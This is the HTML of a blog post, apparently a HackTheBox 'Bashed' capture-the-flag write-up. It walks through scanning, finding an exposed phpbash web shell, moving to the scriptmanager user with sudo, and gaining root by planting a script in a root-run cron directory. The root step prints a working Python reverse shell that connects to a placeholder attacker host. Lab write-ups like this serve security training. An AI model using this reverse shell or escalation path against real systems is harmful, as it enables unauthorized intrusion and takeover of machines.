@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox - Bashed Writeup - SHAFIQAIMAN</title><meta name="Description" content="HacktheBox - Bashed Writeup"><meta property="og:title" content="HackTheBox - Bashed Writeup" />
+<meta property="og:description" content="HacktheBox - Bashed Writeup" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/htb/bashed/" /><meta property="og:image" content="http://localhost:1313/posts/htb/bashed/featured.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-03-01T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-03-01T00:00:00+00:00" /><meta property="og:site_name" content="SHAFIQAIMAN" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="http://localhost:1313/posts/htb/bashed/featured.png" /><meta name="twitter:title" content="HackTheBox - Bashed Writeup"/>
+<meta name="twitter:description" content="HacktheBox - Bashed Writeup"/>
+<meta name="twitter:site" content="@_shafiqaiman_"/>
+<meta name="application-name" content="SHAFIQAIMAN">
+<meta name="apple-mobile-web-app-title" content="SHAFIQAIMAN"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/htb/bashed/" /><link rel="prev" href="http://localhost:1313/posts/htb/unified/" /><link rel="next" href="http://localhost:1313/posts/htb/return/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox - Bashed Writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/htb\/bashed\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/localhost:1313\/posts\/htb\/bashed\/featured.png",
+                            "width":  1400 ,
+                            "height":  1060 
+                        }],"genre": "posts","keywords": "python-shell, gobuster, crontab, upgrade-shell-python, phpbash-webshell","wordcount":  622 ,
+        "url": "http:\/\/localhost:1313\/posts\/htb\/bashed\/","datePublished": "2022-03-01T00:00:00+00:00","dateModified": "2022-03-01T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "SH∆FIQ ∆IM∆N"
+            },"description": "HacktheBox - Bashed Writeup"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i>  </a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i>  </a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i></a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i></a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox - Bashed Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://shafiqaiman.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>SH∆FIQ ∆IM∆N</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HacktheBox</a>&nbsp;<a href="/categories/linux/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="01-03-2022">01-03-2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;622 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/bashed/featured.png"
+        data-srcset="/posts/htb/bashed/featured.png, /posts/htb/bashed/featured.png 1.5x, /posts/htb/bashed/featured.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/bashed/featured.png"
+        title="HacktheBox - Bashed Writeup" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#nmap">Nmap</a>
+      <ul>
+        <li><a href="#result">result</a></li>
+        <li><a href="#http">Http</a></li>
+        <li><a href="#gobuster">Gobuster</a></li>
+        <li><a href="#dev">/dev</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse-shell">Reverse Shell</a>
+      <ul>
+        <li><a href="#upgrade-shell-using-python">Upgrade shell using python</a></li>
+        <li><a href="#user-scriptmanager">User scriptmanager</a></li>
+        <li><a href="#scripts">/scripts</a></li>
+      </ul>
+    </li>
+    <li><a href="#root-shell">Root Shell</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Box author | <span class="h-card person-mention"><a href="https://app.hackthebox.com/users/2904" class="u-url url"><img class="u-photo photo" src="https://www.hackthebox.com/storage/avatars/4a677d39a1156ca6a4f2fdce085aa3da.png" alt="Arrexel">&#8201;<span class="p-name fn">Arrexel</span></a></span></p>
+<h2 id="nmap">Nmap</h2>
+<p>As always. I&rsquo;m gonna run the Nmap scan. Here is the result of the scan.</p>
+<h3 id="result">result</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mi">7</span><span class="p">.</span><span class="mi">92</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">initiated</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">26</span><span class="w"> </span><span class="mi">01</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">32</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">bashed</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">68</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">68</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">054</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Not</span><span class="w"> </span><span class="n">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">999</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="n">ports</span><span class="w"> </span><span class="p">(</span><span class="k">reset</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PORT</span><span class="w">   </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="k">VERSION</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">18</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">Arrexel</span><span class="s1">&#39;s Development Site
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-server-header: Apache/2.4.18 (Ubuntu)
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span class="line"><span class="cl"><span class="s1"># Nmap done at Sat Feb 26 01:50:44 2022 -- 1 IP address (1 host up) scanned in 12.17 seconds
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>port <code>80/HTTP</code> is the only one open.</p>
+<h3 id="http">Http</h3>
+<p>Let&rsquo;s take a look at the website.</p>
+<p><figure><a class="lightgallery" href="/posts/htb/bashed/website.png" title="phpbash webpage" data-thumbnail="/posts/htb/bashed/website.png" data-sub-html="<h2>phpbash webpage</h2><p>phpbash webpage</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/bashed/website.png"
+            data-srcset="/posts/htb/bashed/website.png, /posts/htb/bashed/website.png 1.5x, /posts/htb/bashed/website.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/bashed/website.png" width="1013" height="428" />
+    </a><figcaption class="image-caption">phpbash webpage</figcaption>
+    </figure></p>
+<p>Turns out, the <code>phpbash</code> is a web shell. Well, it is an open-source project and I found the GitHub link on the site itself.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">https://github.com/Arrexel/phpbash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On the GitHub page. The <code>phpbash</code> location looks like at the uploads directory. However, when I went to the uploads directory it&rsquo;s nothing there.</p>
+<p><figure><a class="lightgallery" href="/posts/htb/bashed/upload_dir.png" title="check upload directory" data-thumbnail="/posts/htb/bashed/upload_dir.png" data-sub-html="<h2>check upload directory</h2><p>check upload directory</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/bashed/upload_dir.png"
+            data-srcset="/posts/htb/bashed/upload_dir.png, /posts/htb/bashed/upload_dir.png 1.5x, /posts/htb/bashed/upload_dir.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/bashed/upload_dir.png" width="761" height="439" />
+    </a><figcaption class="image-caption">check upload directory</figcaption>
+    </figure></p>
+<h3 id="gobuster">Gobuster</h3>
+<p>So, I&rsquo;m gonna run the <code>gobuster</code> to search all hidden directories. It found a bunch of directories but the <code>/dev</code> really caught my eye.</p>
+<p><figure><a class="lightgallery" href="/posts/htb/bashed/gobuster.png" title="gobuster" data-thumbnail="/posts/htb/bashed/gobuster.png" data-sub-html="<h2>gobuster</h2><p>gobuster</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/bashed/gobuster.png"
+            data-srcset="/posts/htb/bashed/gobuster.png, /posts/htb/bashed/gobuster.png 1.5x, /posts/htb/bashed/gobuster.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/bashed/gobuster.png" width="905" height="489" />
+    </a><figcaption class="image-caption">gobuster</figcaption>
+    </figure></p>
+<h3 id="dev">/dev</h3>
+<p>Let&rsquo;s take a look at the <code>/dev</code> directory. Wow! found it. Now, I&rsquo;m just clicking the <code>phpbash.php</code> and I&rsquo;ve got the web shell as the <code>www-data</code> user.</p>
+<p><figure><a class="lightgallery" href="/posts/htb/bashed/dev.png" title="directory listing" data-thumbnail="/posts/htb/bashed/dev.png" data-sub-html="<h2>directory listing</h2><p>directory listing</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/bashed/dev.png"
+            data-srcset="/posts/htb/bashed/dev.png, /posts/htb/bashed/dev.png 1.5x, /posts/htb/bashed/dev.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/bashed/dev.png" width="693" height="326" />
+    </a><figcaption class="image-caption">directory listing</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/posts/htb/bashed/web_shell.png" title="phpbash web shell" data-thumbnail="/posts/htb/bashed/web_shell.png" data-sub-html="<h2>phpbash web shell</h2><p>phpbash web shell</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/bashed/web_shell.png"
+            data-srcset="/posts/htb/bashed/web_shell.png, /posts/htb/bashed/web_shell.png 1.5x, /posts/htb/bashed/web_shell.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/bashed/web_shell.png" width="968" height="905" />
+    </a><figcaption class="image-caption">phpbash web shell</figcaption>
+    </figure></p>
+<h2 id="reverse-shell">Reverse Shell</h2>
+<p>Let&rsquo;s try to get the proper reverse shell. I have already tried a bunch of things to gain the reverse shell. However, the <code>base64</code> method seems to be working.</p>
+<p>So, the first thing is I&rsquo;m gonna encoded this <code>bash reverse shell</code> into <code>base64</code></p>
+<p><figure><a class="lightgallery" href="/posts/htb/bashed/b64.png" title="bash oneliner base64" data-thumbnail="/posts/htb/bashed/b64.png" data-sub-html="<h2>bash oneliner base64</h2><p>bash oneliner base64</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/bashed/b64.png"
+            data-srcset="/posts/htb/bashed/b64.png, /posts/htb/bashed/b64.png 1.5x, /posts/htb/bashed/b64.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/bashed/b64.png" width="759" height="145" />
+    </a><figcaption class="image-caption">bash oneliner base64</figcaption>
+    </figure></p>
+<p>Then, I&rsquo;m gonna put it into the input of <code>phpbash</code>. Down below; is a syntax should be.  Make sure to set up an <code>nc</code> listener first.</p>
+<p><figure><a class="lightgallery" href="/posts/htb/bashed/bs64_webshell.png" title="execute reverse shell" data-thumbnail="/posts/htb/bashed/bs64_webshell.png" data-sub-html="<h2>execute reverse shell</h2><p>execute reverse shell</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/bashed/bs64_webshell.png"
+            data-srcset="/posts/htb/bashed/bs64_webshell.png, /posts/htb/bashed/bs64_webshell.png 1.5x, /posts/htb/bashed/bs64_webshell.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/bashed/bs64_webshell.png" width="1048" height="82" />
+    </a><figcaption class="image-caption">execute reverse shell</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/posts/htb/bashed/got_the_shell.png" title="shell as www-data" data-thumbnail="/posts/htb/bashed/got_the_shell.png" data-sub-html="<h2>shell as www-data</h2><p>shell as www-data</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/bashed/got_the_shell.png"
+            data-srcset="/posts/htb/bashed/got_the_shell.png, /posts/htb/bashed/got_the_shell.png 1.5x, /posts/htb/bashed/got_the_shell.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/bashed/got_the_shell.png" width="840" height="283" />
+    </a><figcaption class="image-caption">shell as www-data</figcaption>
+    </figure></p>
+<h3 id="upgrade-shell-using-python">Upgrade shell using python</h3>
+<p>YES! I got the shell. Let&rsquo;s upgrade this shell into a proper shell. First, let&rsquo;s import called <code>/bin/bash</code> using python with <code>pty module</code>. Then, export the terminal to have the clear screen and press <code>Ctrl + Z</code> to put it, into the background. Last, type the <code>stty raw -echo; fg</code> and press <code>Enter</code> 2 times, and there you go!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-&gt; python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">-&gt; <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span><span class="line"><span class="cl">Ctrl + Z 
+</span></span><span class="line"><span class="cl">-&gt; stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="user-scriptmanager">User scriptmanager</h3>
+<p>The first thing a love to do when get access to the machine. I love to check the sudo permission. Let&rsquo;s check it with <code>sudo -l</code>. Shockingly, I can run the <code>sudo</code> with the <code>www-data</code> user.</p>
+<p><figure><a class="lightgallery" href="/posts/htb/bashed/scriptmanager.png" title="check sudo permission" data-thumbnail="/posts/htb/bashed/scriptmanager.png" data-sub-html="<h2>check sudo permission</h2><p>check sudo permission</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/bashed/scriptmanager.png"
+            data-srcset="/posts/htb/bashed/scriptmanager.png, /posts/htb/bashed/scriptmanager.png 1.5x, /posts/htb/bashed/scriptmanager.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/bashed/scriptmanager.png" width="584" height="179" />
+    </a><figcaption class="image-caption">check sudo permission</figcaption>
+    </figure></p>
+<p>Looks like, I can run any command with the <code>scriptmanager</code> user without authentication. Well, let&rsquo;s change into that user with this syntax;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo -u scriptmanager bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/posts/htb/bashed/change_2_scriptmanager.png" title="change user to scriptmanager" data-thumbnail="/posts/htb/bashed/change_2_scriptmanager.png" data-sub-html="<h2>change user to scriptmanager</h2><p>change user to scriptmanager</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/bashed/change_2_scriptmanager.png"
+            data-srcset="/posts/htb/bashed/change_2_scriptmanager.png, /posts/htb/bashed/change_2_scriptmanager.png 1.5x, /posts/htb/bashed/change_2_scriptmanager.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/bashed/change_2_scriptmanager.png" width="805" height="211" />
+    </a><figcaption class="image-caption">change user to scriptmanager</figcaption>
+    </figure></p>
+<h3 id="scripts">/scripts</h3>
+<p>This is caught by surprise. I found the <code>/scripts</code> directory located in the base <code>/</code>. Luckily, I already become the <code>scriptmanager</code>. Let&rsquo;s take a peek into the particular directory.</p>
+<p><figure><a class="lightgallery" href="/posts/htb/bashed/script_dir.png" title="found /scripts directory" data-thumbnail="/posts/htb/bashed/script_dir.png" data-sub-html="<h2>found /scripts directory</h2><p>found /scripts directory</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/bashed/script_dir.png"
+            data-srcset="/posts/htb/bashed/script_dir.png, /posts/htb/bashed/script_dir.png 1.5x, /posts/htb/bashed/script_dir.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/bashed/script_dir.png" width="1187" height="573" />
+    </a><figcaption class="image-caption">found /scripts directory</figcaption>
+    </figure></p>
+<p>So, the directory content 2 files are called <code>test.py</code> and <code>test.txt</code>. However, the test.txt is owned by the <code>root</code> user. After endless investigation ;) Looks like any python file in here is gonna run by root. Like a <code>cronjob</code>.</p>
+<p><figure><a class="lightgallery" href="/posts/htb/bashed/contents.png" title="contents in /scripts" data-thumbnail="/posts/htb/bashed/contents.png" data-sub-html="<h2>contents in /scripts</h2><p>contents in /scripts</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/bashed/contents.png"
+            data-srcset="/posts/htb/bashed/contents.png, /posts/htb/bashed/contents.png 1.5x, /posts/htb/bashed/contents.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/bashed/contents.png" width="714" height="156" />
+    </a><figcaption class="image-caption">contents in /scripts</figcaption>
+    </figure></p>
+<h2 id="root-shell">Root Shell</h2>
+<p>What we know. Any python file in that directory got to execute. So, I&rsquo;m gonna make a <code>python file</code> that contains <code>reverse shell</code>. After, all set up just wait for a minute, and BOOM! <br>
+<em><font color="yellow">make sure to setup nc listener first</font></em></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Python Reverse Shell</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&#34;TUN0&#34;</span><span class="p">,</span><span class="n">PORT</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pty</span><span class="p">;</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/posts/htb/bashed/petai_root.png" title="shell as root" data-thumbnail="/posts/htb/bashed/petai_root.png" data-sub-html="<h2>shell as root</h2><p>shell as root</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/bashed/petai_root.png"
+            data-srcset="/posts/htb/bashed/petai_root.png, /posts/htb/bashed/petai_root.png 1.5x, /posts/htb/bashed/petai_root.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/bashed/petai_root.png" width="652" height="183" />
+    </a><figcaption class="image-caption">shell as root</figcaption>
+    </figure></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 01-03-2022</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/htb/bashed/" data-title="HackTheBox - Bashed Writeup" data-via="_shafiqaiman_" data-hashtags="python-shell,gobuster,crontab,upgrade-shell-python,phpbash-webshell"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/posts/htb/bashed/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/posts/htb/bashed/" data-title="HackTheBox - Bashed Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="http://localhost:1313/posts/htb/bashed/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/python-shell/">Python-Shell</a>,&nbsp;<a href="/tags/gobuster/">Gobuster</a>,&nbsp;<a href="/tags/crontab/">Crontab</a>,&nbsp;<a href="/tags/upgrade-shell-python/">Upgrade-Shell-Python</a>,&nbsp;<a href="/tags/phpbash-webshell/">Phpbash-Webshell</a></section>
+        <section>
